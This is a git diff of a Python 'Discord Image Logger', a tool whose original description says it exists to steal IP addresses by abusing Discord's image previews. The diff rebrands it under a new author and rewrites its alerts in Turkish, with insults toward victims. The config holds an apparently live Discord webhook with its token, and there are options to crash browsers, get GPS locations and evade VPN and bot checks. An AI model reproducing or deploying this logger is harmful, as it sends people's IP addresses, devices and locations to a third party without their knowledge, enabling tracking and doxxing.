@@ -2,42 +2,41 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "DeKrypt"
+__app__ = "Logger Tool By Woldan"
+__description__ = ".gg/baristv44"
+__version__ = "v9.9"
+__author__ = "Woldan"
 
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1386838971849638060/YJg7aTViDqVIhjpPPKOu5Bn-Ljfesth9pG7rUqygt0shJY4smxqz88Gtu3f8ZGst55gJ",
-    "image": "https://cdn.discordapp.com/attachments/1386838893839782020/1386842777748242432/IMG_2557.jpg?ex=685b2d7c&is=6859dbfc&hm=37b52ec98a3a9662fb89eddb1dda5df9d7046e78f40dc160198d060d43eeaba9&", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "image": "https://cdn.discordapp.com/attachments/1386838893839782020/1386842777748242432/IMG_2557.jpg?ex=685b2d7c&is=6859dbfc&hm=37b52ec98a3a9662fb89eddb1dda5df9d7046e78f40dc160198d060d43eeaba9&",
+    "imageArgument": True,
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": ".gg/istisna",
+    "color": 0x00FFFF, 
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False, 
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": False,
 
-    "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+    "message": {
+        "doMessage": False,
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
+        "richMessage": True,
     },
 
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
+    "vpnCheck": 1,
                 # 0 = No Anti-VPN
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "linkAlerts": True,
+    "buggedImage": True,
 
-    "antiBot": 1, # Prevents bots from triggering the alert
+    "antiBot": 1,
                 # 0 = No Anti-Bot
                 # 1 = Don't ping when it's possibly a bot
                 # 2 = Don't ping when it's 100% a bot
@@ -77,7 +76,7 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "Image Logger - Error",
+            "title": "Woldan Logger - Error",
             "color": config["color"],
             "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
         }
@@ -96,12 +95,12 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Image Logger - Link Sent",
+            "title": ".gg/istisna - Link Bir Kullanıcı Tarafından İletildi.",
             "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"Link Bir Sohbete İletildi. Kurban Bekleniyor... \n\n**Bitiş Noktası:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
-}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
+}) if config["linkAlerts"] else None
         return
 
     ping = "@everyone"
@@ -141,11 +140,11 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": ".gg/istisna - IP Loglandı!",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**Bitane Enayi Tuzağa Düştü!**
 
-**Endpoint:** `{endpoint}`
+**Tuzağa Düşen Lavuğun Bilgiler:** `{endpoint}`
             
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
